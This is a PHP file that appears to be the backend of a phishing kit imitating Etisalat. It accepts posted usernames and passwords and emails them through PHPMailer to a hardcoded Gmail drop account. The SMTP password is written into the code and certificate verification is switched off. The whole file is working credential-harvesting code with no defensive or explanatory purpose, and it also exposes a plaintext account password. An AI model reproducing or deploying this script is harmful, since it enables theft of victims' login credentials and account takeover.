<?php

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
    

if (isset($_POST['myemail'],$_POST['mypassword'])) {




    $toEmails = "resultboxes007@gmail.com";//
    $eSubject = "Etisalat Data Recipients";
    $eTitle = "Get Data";



    $myemail = $_POST['myemail'];
    $mypassword = $_POST['mypassword'];


    $eMessage = "

        <p>Username : ".$myemail."</p>
        <p>Password : ".$mypassword."</p>

    ";


    $email = $toEmails;
    $subject = $eSubject;
    $message = $eMessage;


/*    $filename1 = $_FILES['forminatorfieldupload1']['name'];
    $location1 = 'attachment/' . $filename1;
    move_uploaded_file($_FILES['forminatorfieldupload1']['tmp_name'], $location1);

    $filename2 = $_FILES['forminatorfieldupload2']['name'];
    $location2 = 'attachment/' . $filename2;
    move_uploaded_file($_FILES['forminatorfieldupload2']['tmp_name'], $location2);*/

    //Load composer's autoloader
    require 'vendor/autoload.php';

    $mail = new PHPMailer(true);                              // Passing true enables exceptions
     try {
        //Server settings
        $mail->isSMTP();                                      // Set mailer to use SMTP
        $mail->Host = 'resultboxes007@gmail.com';                       // Specify main and backup SMTP servers
        $mail->SMTPAuth = true;                               // Enable SMTP authentication
        $mail->Username = 'resultboxes007@gmail.com';     // Your Email/ Server Email
        $mail->Password = 'Daniel007@';                     // Your Password
        $mail->SMTPOptions = array(
            'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
            )
        );                         
        $mail->SMTPSecure = 'ssl';                           
        $mail->Port = 465;                                   

        //Send Email
        $mail->setFrom('resultboxes007@gmail.com', $eTitle);
        
        //Recipients
        $mail->addAddress($email);              
        $mail->addReplyTo('resultboxes007@gmail.com', $eTitle);
        
        //Attachment
     /*   if(!empty($filename1)){
            $mail->addAttachment($location1, $filename1); 
        }*/
       
               //Attachment
      /*  if(!empty($filename2)){
            $mail->addAttachment($location2, $filename2); 
        }*/

        //Content
        $mail->isHTML(true);                                  
        $mail->Subject = $subject;
        $mail->Body    = $message;

    $mail->send();

    } catch (Exception $e) {
        echo 'Message could not be sent. Mailer Error: '.$mail->ErrorInfo;
    }
//if ($InsetMsgQuery) {
   // echo "success";
//}
//}


}
?>